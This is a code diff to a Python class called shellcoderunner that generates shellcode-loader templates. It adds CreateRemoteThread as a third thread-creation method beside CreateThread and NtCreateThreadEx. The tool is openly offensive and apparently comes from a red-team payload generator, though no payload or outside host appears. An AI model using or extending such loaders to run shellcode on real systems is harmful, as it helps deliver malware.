@@ -34,10 +34,10 @@ class shellcoderunner:
 
         self.execute = 'CreateThread'
         if 'execute' in arguments:
-            if arguments['execute'] in ['CreateThread', 'NtCreateThreadEx']:
+            if arguments['execute'] in ['CreateThread', 'NtCreateThreadEx', 'CreateRemoteThread']:
                 self.execute = arguments['execute']
             else:
-                print('Execute argument must be CreateThread or NtCreateThreadEx')
+                print('Execute argument must be CreateThread, CreateRemoteThread or NtCreateThreadEx')
                 exit(0)
 
         self.wait = 'WaitForSingleObject'
@@ -134,6 +134,11 @@ class shellcoderunner:
     {NtCreateThreadEx}(ptr(hThreadBuffer), ThreadAccessRights.THREAD_ALL_ACCESS, null, -1n, address, 0n, 0, 0n, 0n, 0n, null);
     let hThread = hThreadBuffer[0];
 """
+        elif self.execute == 'CreateRemoteThread':
+            template += """
+    let hThread = {CreateRemoteThread}(-1n, null, 0, address, 0, 0, null);
+"""
+
         if self.wait == 'WaitForSingleObject':
             template += """
     {WaitForSingleObject}(hThread, 0xFFFFFFFF);
